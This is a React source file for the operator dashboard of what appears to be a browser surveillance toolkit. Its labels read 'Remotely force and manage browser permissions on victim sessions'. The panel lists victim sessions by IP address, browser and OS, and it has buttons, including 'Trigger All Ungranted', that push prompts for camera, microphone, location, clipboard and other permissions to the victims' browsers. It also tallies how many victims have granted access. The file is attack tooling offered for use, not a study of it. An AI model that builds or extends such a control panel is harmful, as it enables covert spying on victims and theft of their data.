import React, { useState, useEffect, useCallback } from 'react';
import {
  Box, Typography, Card, CardContent, Grid, Chip, Button, IconButton,
  Tooltip, CircularProgress, Alert, Table, TableBody, TableCell,
  TableContainer, TableHead, TableRow, Paper, LinearProgress, Switch,
  FormControlLabel, Dialog, DialogTitle, DialogContent, DialogActions,
  TextField, Select, MenuItem, FormControl, InputLabel, Badge
} from '@mui/material';
import axios from 'axios';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5000';
import VideocamIcon from '@mui/icons-material/Videocam';
import MicIcon from '@mui/icons-material/Mic';
import LocationOnIcon from '@mui/icons-material/LocationOn';
import NotificationsIcon from '@mui/icons-material/Notifications';
import ContentPasteIcon from '@mui/icons-material/ContentPaste';
import BluetoothIcon from '@mui/icons-material/Bluetooth';
import UsbIcon from '@mui/icons-material/Usb';
import PianoIcon from '@mui/icons-material/Piano';
import RefreshIcon from '@mui/icons-material/Refresh';
import FlashOnIcon from '@mui/icons-material/FlashOn';
import SensorOccupiedIcon from '@mui/icons-material/SensorOccupied';
import WbSunnyIcon from '@mui/icons-material/WbSunny';
import ScreenRotationIcon from '@mui/icons-material/ScreenRotation';
import StorageIcon from '@mui/icons-material/Storage';
import BoltIcon from '@mui/icons-material/Bolt';

const PERMISSION_DEFINITIONS = [
  { key: 'camera', label: 'Camera', icon: <VideocamIcon />, color: '#00f0ff', desc: 'Capture video and images', risk: 'High' },
  { key: 'microphone', label: 'Microphone', icon: <MicIcon />, color: '#ffaa00', desc: 'Record audio', risk: 'High' },
  { key: 'geolocation', label: 'Location', icon: <LocationOnIcon />, color: '#00ff88', desc: 'Track GPS position', risk: 'High' },
  { key: 'notifications', label: 'Notifications', icon: <NotificationsIcon />, color: '#ff66aa', desc: 'Send push alerts', risk: 'Medium' },
  { key: 'clipboard', label: 'Clipboard', icon: <ContentPasteIcon />, color: '#aa88ff', desc: 'Read clipboard data', risk: 'High' },
  { key: 'bluetooth', label: 'Bluetooth', icon: <BluetoothIcon />, color: '#66ccff', desc: 'Discover nearby devices', risk: 'Medium' },
  { key: 'usb', label: 'USB', icon: <UsbIcon />, color: '#ff8844', desc: 'Access USB devices', risk: 'Medium' },
  { key: 'midi', label: 'MIDI', icon: <PianoIcon />, color: '#88dd88', desc: 'Access MIDI devices', risk: 'Low' },
  { key: 'persistentStorage', label: 'Storage', icon: <StorageIcon />, color: '#ff5588', desc: 'Persistent data storage', risk: 'Low' },
  { key: 'vibration', label: 'Vibration', icon: <BoltIcon />, color: '#cccccc', desc: 'Device vibration', risk: 'Low' },
  { key: 'orientation', label: 'Orientation', icon: <ScreenRotationIcon />, color: '#99ccff', desc: 'Device orientation', risk: 'Low' },
  { key: 'ambientLight', label: 'Light Sensor', icon: <WbSunnyIcon />, color: '#ffee88', desc: 'Ambient light level', risk: 'Low' },
  { key: 'proximity', label: 'Proximity', icon: <SensorOccupiedIcon />, color: '#dddddd', desc: 'Proximity sensor', risk: 'Low' }
];

function PermissionCard({ permission, status, onTrigger }) {
  const getStatusColor = (s) => {
    switch(s) {
      case 'granted': return '#00ff88';
      case 'denied': return '#ff3355';
      case 'pending': return '#ffaa00';
      default: return '#555';
    }
  };

  const getStatusBg = (s) => {
    switch(s) {
      case 'granted': return 'rgba(0,255,136,0.1)';
      case 'denied': return 'rgba(255,51,85,0.1)';
      case 'pending': return 'rgba(255,170,0,0.1)';
      default: return 'rgba(255,255,255,0.03)';
    }
  };

  const statusLabel = status || 'unknown';

  return (
    <Card sx={{
      bgcolor: '#111827',
      border: '1px solid rgba(255,255,255,0.06)',
      borderLeft: `3px solid ${getStatusColor(statusLabel)}`,
      transition: 'all 0.2s',
      '&:hover': { borderColor: 'rgba(255,255,255,0.15)', transform: 'translateY(-1px)' }
    }}>
      <CardContent sx={{ p: 2, '&:last-child': { pb: 2 } }}>
        <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', mb: 1 }}>
          <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
            <Box sx={{ color: permission.color, opacity: 0.8 }}>{permission.icon}</Box>
            <Box>
              <Typography variant="body2" sx={{ color: '#fff', fontWeight: 600, fontSize: '0.85rem' }}>
                {permission.label}
              </Typography>
              <Typography variant="caption" sx={{ color: '#666', fontSize: '0.65rem' }}>
                {permission.desc}
              </Typography>
            </Box>
          </Box>
          <Chip
            label={statusLabel}
            size="small"
            sx={{
              color: getStatusColor(statusLabel),
              bgcolor: getStatusBg(statusLabel),
              fontWeight: 600,
              fontSize: '0.65rem',
              height: 22,
              textTransform: 'uppercase'
            }}
          />
        </Box>
        <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', mt: 1 }}>
          <Chip
            label={`Risk: ${permission.risk}`}
            size="small"
            variant="outlined"
            sx={{
              color: permission.risk === 'High' ? '#ff3355' : permission.risk === 'Medium' ? '#ffaa00' : '#888',
              borderColor: 'rgba(255,255,255,0.1)',
              fontSize: '0.6rem',
              height: 20
            }}
          />
          <Button
            size="small"
            variant="outlined"
            onClick={() => onTrigger(permission.key)}
            disabled={status === 'granted'}
            sx={{
              color: status === 'granted' ? '#555' : '#00f0ff',
              borderColor: status === 'granted' ? 'rgba(255,255,255,0.1)' : 'rgba(0,240,255,0.3)',
              fontSize: '0.7rem',
              py: 0.2,
              minWidth: 60,
              '&:hover': { borderColor: '#00f0ff', bgcolor: 'rgba(0,240,255,0.08)' }
            }}
          >
            {status === 'granted' ? 'Granted' : 'Trigger'}
          </Button>
        </Box>
      </CardContent>
    </Card>
  );
}

export default function PermissionsControl() {
  const [sessions, setSessions] = useState([]);
  const [selectedSession, setSelectedSession] = useState(null);
  const [permissions, setPermissions] = useState({});
  const [loading, setLoading] = useState(false);
  const [triggerLoading, setTriggerLoading] = useState(null);
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [snackbar, setSnackbar] = useState({ open: false, message: '', severity: 'success' });
  const [stats, setStats] = useState(null);

  const fetchPermissions = useCallback(async (sessionId) => {
    try {
      const res = await axios.get(`${API_URL}/api/admin/sessions/${sessionId}/permissions`);
      setPermissions(res.data.permissions || {});
      return res.data;
    } catch (e) {
      console.error('Failed to fetch permissions:', e);
      return null;
    }
  }, []);

  const fetchSessions = useCallback(async () => {
    try {
      const res = await axios.get(`${API_URL}/api/admin/sessions?limit=50&sortBy=-lastActiveAt`);
      setSessions(res.data.sessions || []);
      
      // If no selected session, select the first online one
      if (!selectedSession && res.data.sessions.length > 0) {
        const online = res.data.sessions.find(s => s.isOnline);
        setSelectedSession(online || res.data.sessions[0]);
        await fetchPermissions((online || res.data.sessions[0])._id);
      }
    } catch (e) {
      console.error('Failed to fetch sessions:', e);
    }
  }, [selectedSession, fetchPermissions]);

  const fetchStats = useCallback(async () => {
    try {
      const res = await axios.get(`${API_URL}/api/admin/permissions/stats`);
      setStats(res.data);
    } catch (e) {}
  }, []);

  useEffect(() => {
    fetchSessions();
    fetchStats();

    if (autoRefresh) {
      const interval = setInterval(() => {
        if (selectedSession) fetchPermissions(selectedSession._id);
        fetchStats();
      }, 10000);
      return () => clearInterval(interval);
    }
  }, [autoRefresh, selectedSession, fetchSessions, fetchPermissions, fetchStats]);

  useEffect(() => {
    if (selectedSession) {
      fetchPermissions(selectedSession._id);
    }
  }, [selectedSession, fetchPermissions]);

  const handleSessionSelect = async (session) => {
    setSelectedSession(session);
    setLoading(true);
    await fetchPermissions(session._id);
    setLoading(false);
  };

  const handleTrigger = async (permissionType) => {
    if (!selectedSession) return;
    setTriggerLoading(permissionType);
    
    try {
      const res = await axios.post(`${API_URL}/api/admin/sessions/${selectedSession._id}/permissions/trigger`, {
        permissionType
      });
      
      setSnackbar({ open: true, message: `Permission '${permissionType}' triggered for session`, severity: 'success' });
      
      // Update local permission status to pending
      setPermissions(prev => ({
        ...prev,
        [permissionType]: { ...prev[permissionType], status: 'pending' }
      }));
    } catch (e) {
      setSnackbar({ open: true, message: e.response?.data?.error || 'Failed to trigger permission', severity: 'error' });
    }
    
    setTriggerLoading(null);
  };

  const getStatusCounts = () => {
    const counts = { granted: 0, denied: 0, unknown: 0, pending: 0 };
    Object.values(permissions).forEach(p => {
      if (p && p.status) counts[p.status] = (counts[p.status] || 0) + 1;
    });
    return counts;
  };

  const statusCounts = getStatusCounts();

  return (
    <Box>
      {/* Header */}
      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 3 }}>
        <Box>
          <Typography variant="h4" sx={{ color: '#fff', fontWeight: 700, fontSize: '1.5rem' }}>
            ⚡ Permission Control
          </Typography>
          <Typography variant="body2" sx={{ color: '#888', mt: 0.5 }}>
            Remotely force and manage browser permissions on victim sessions
          </Typography>
        </Box>
        <Box sx={{ display: 'flex', alignItems: 'center', gap: 2 }}>
          <FormControlLabel
            control={<Switch checked={autoRefresh} onChange={(e) => setAutoRefresh(e.target.checked)} size="small" />}
            label="Auto-refresh"
            sx={{ color: '#888', '& .MuiTypography-root': { fontSize: '0.8rem' } }}
          />
          <Button
            variant="outlined"
            startIcon={<RefreshIcon />}
            onClick={() => { fetchSessions(); fetchStats(); }}
            sx={{ color: '#00f0ff', borderColor: 'rgba(0,240,255,0.3)' }}
          >
            Refresh
          </Button>
        </Box>
      </Box>

      {/* Stats Cards */}
      {stats && (
        <Grid container spacing={2} sx={{ mb: 3 }}>
          {[
            { label: 'Camera', value: stats.cameraGranted, icon: <VideocamIcon />, color: '#00f0ff' },
            { label: 'Microphone', value: stats.microphoneGranted, icon: <MicIcon />, color: '#ffaa00' },
            { label: 'Location', value: stats.geolocationGranted, icon: <LocationOnIcon />, color: '#00ff88' },
            { label: 'Notifications', value: stats.notificationsGranted, icon: <NotificationsIcon />, color: '#ff66aa' },
            { label: 'Clipboard', value: stats.clipboardGranted, icon: <ContentPasteIcon />, color: '#aa88ff' }
          ].map((stat, i) => (
            <Grid item xs={12} sm={6} md={2.4} key={i}>
              <Card sx={{ bgcolor: '#111827', border: '1px solid rgba(255,255,255,0.06)', textAlign: 'center', py: 2 }}>
                <Box sx={{ color: stat.color, opacity: 0.8, mb: 0.5 }}>{stat.icon}</Box>
                <Typography variant="h5" sx={{ color: '#fff', fontWeight: 700 }}>
                  {stat.value}
                </Typography>
                <Typography variant="caption" sx={{ color: '#888', fontSize: '0.65rem' }}>
                  {stat.label}
                </Typography>
              </Card>
            </Grid>
          ))}
        </Grid>
      )}

      <Grid container spacing={2}>
        {/* Session List */}
        <Grid item xs={12} md={4}>
          <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.06)' }}>
            <CardContent sx={{ p: 2 }}>
              <Typography variant="subtitle2" sx={{ color: '#aaa', mb: 1, fontSize: '0.75rem', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
                Victim Sessions
              </Typography>
              <TableContainer sx={{ maxHeight: 'calc(100vh - 350px)', '&::-webkit-scrollbar': { width: 4 }, '&::-webkit-scrollbar-thumb': { bgcolor: '#333', borderRadius: 2 } }}>
                <Table size="small" stickyHeader>
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ color: '#888', borderBottom: '1px solid rgba(255,255,255,0.06)', fontSize: '0.7rem', fontWeight: 600 }}>Session</TableCell>
                      <TableCell sx={{ color: '#888', borderBottom: '1px solid rgba(255,255,255,0.06)', fontSize: '0.7rem', fontWeight: 600 }}>Status</TableCell>
                      <TableCell sx={{ color: '#888', borderBottom: '1px solid rgba(255,255,255,0.06)', fontSize: '0.7rem', fontWeight: 600 }}>OS</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {sessions.map(session => (
                      <TableRow
                        key={session._id}
                        hover
                        selected={selectedSession?._id === session._id}
                        onClick={() => handleSessionSelect(session)}
                        sx={{
                          cursor: 'pointer',
                          bgcolor: selectedSession?._id === session._id ? 'rgba(0,240,255,0.05)' : 'transparent',
                          '&:hover': { bgcolor: 'rgba(255,255,255,0.03)' },
                          '&.Mui-selected': { bgcolor: 'rgba(0,240,255,0.08)' }
                        }}
                      >
                        <TableCell sx={{ borderBottom: '1px solid rgba(255,255,255,0.04)', py: 1 }}>
                          <Typography variant="caption" sx={{ color: '#ccc', fontSize: '0.7rem', fontFamily: 'monospace' }}>
                            {session.sessionId?.substring(0, 12)}...
                          </Typography>
                          <Typography variant="caption" display="block" sx={{ color: '#666', fontSize: '0.6rem' }}>
                            {session.ipAddress || 'N/A'}
                          </Typography>
                        </TableCell>
                        <TableCell sx={{ borderBottom: '1px solid rgba(255,255,255,0.04)', py: 1 }}>
                          <Chip
                            label={session.isOnline ? 'Online' : 'Offline'}
                            size="small"
                            sx={{
                              color: session.isOnline ? '#00ff88' : '#555',
                              bgcolor: session.isOnline ? 'rgba(0,255,136,0.1)' : 'rgba(255,255,255,0.03)',
                              fontSize: '0.6rem',
                              height: 20
                            }}
                          />
                        </TableCell>
                        <TableCell sx={{ borderBottom: '1px solid rgba(255,255,255,0.04)', py: 1 }}>
                          <Typography variant="caption" sx={{ color: '#888', fontSize: '0.65rem' }}>
                            {session.os || '?'}
                          </Typography>
                        </TableCell>
                      </TableRow>
                    ))}
                    {sessions.length === 0 && (
                      <TableRow>
                        <TableCell colSpan={3} sx={{ textAlign: 'center', color: '#555', py: 4, fontSize: '0.8rem' }}>
                          No sessions yet
                        </TableCell>
                      </TableRow>
                    )}
                  </TableBody>
                </Table>
              </TableContainer>
            </CardContent>
          </Card>
        </Grid>

        {/* Permission Controls */}
        <Grid item xs={12} md={8}>
          {selectedSession ? (
            <>
              {/* Session Info */}
              <Card sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.06)', mb: 2 }}>
                <CardContent sx={{ p: 2, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <Box>
                    <Typography variant="subtitle2" sx={{ color: '#fff', fontSize: '0.9rem' }}>
                      Session: <span style={{ color: '#00f0ff', fontFamily: 'monospace' }}>{selectedSession.sessionId}</span>
                    </Typography>
                    <Typography variant="caption" sx={{ color: '#666' }}>
                      {selectedSession.ipAddress} • {selectedSession.browser} • {selectedSession.os}
                    </Typography>
                  </Box>
                  <Box sx={{ display: 'flex', gap: 1 }}>
                    <Chip label={`${statusCounts.granted} Granted`} size="small" sx={{ color: '#00ff88', bgcolor: 'rgba(0,255,136,0.1)', fontSize: '0.65rem' }} />
                    <Chip label={`${statusCounts.denied} Denied`} size="small" sx={{ color: '#ff3355', bgcolor: 'rgba(255,51,85,0.1)', fontSize: '0.65rem' }} />
                    <Chip label={`${statusCounts.pending} Pending`} size="small" sx={{ color: '#ffaa00', bgcolor: 'rgba(255,170,0,0.1)', fontSize: '0.65rem' }} />
                  </Box>
                </CardContent>
              </Card>

              {/* Permission Grid */}
              {loading ? (
                <Box sx={{ textAlign: 'center', py: 8 }}>
                  <CircularProgress sx={{ color: '#00f0ff' }} />
                  <Typography sx={{ color: '#888', mt: 2, fontSize: '0.85rem' }}>Loading permissions...</Typography>
                </Box>
              ) : (
                <Grid container spacing={1.5}>
                  {PERMISSION_DEFINITIONS.map(perm => (
                    <Grid item xs={12} sm={6} md={4} key={perm.key}>
                      <PermissionCard
                        permission={perm}
                        status={permissions[perm.key]?.status || 'unknown'}
                        onTrigger={handleTrigger}
                      />
                    </Grid>
                  ))}
                </Grid>
              )}

              {/* Trigger All Button */}
              <Box sx={{ mt: 2, display: 'flex', gap: 1 }}>
                <Button
                  variant="outlined"
                  startIcon={<FlashOnIcon />}
                  onClick={() => {
                    PERMISSION_DEFINITIONS.forEach(p => {
                      if (permissions[p.key]?.status !== 'granted') {
                        handleTrigger(p.key);
                      }
                    });
                  }}
                  sx={{ color: '#ffaa00', borderColor: 'rgba(255,170,0,0.3)', '&:hover': { borderColor: '#ffaa00' } }}
                >
                  Trigger All Ungranted
                </Button>
                <Button
                  variant="outlined"
                  startIcon={<RefreshIcon />}
                  onClick={() => fetchPermissions(selectedSession._id)}
                  sx={{ color: '#00f0ff', borderColor: 'rgba(0,240,255,0.3)' }}
                >
                  Refresh Permissions
                </Button>
              </Box>
            </>
          ) : (
            <Box sx={{ textAlign: 'center', py: 12, color: '#555' }}>
              <Typography variant="h5" sx={{ mb: 1, opacity: 0.5 }}>⚡</Typography>
              <Typography sx={{ fontSize: '0.9rem' }}>Select a session to view and control permissions</Typography>
              <Typography variant="caption" sx={{ fontSize: '0.75rem', mt: 1, display: 'block' }}>
                Configure browser permissions on victim devices remotely
              </Typography>
            </Box>
          )}
        </Grid>
      </Grid>
    </Box>
  );
}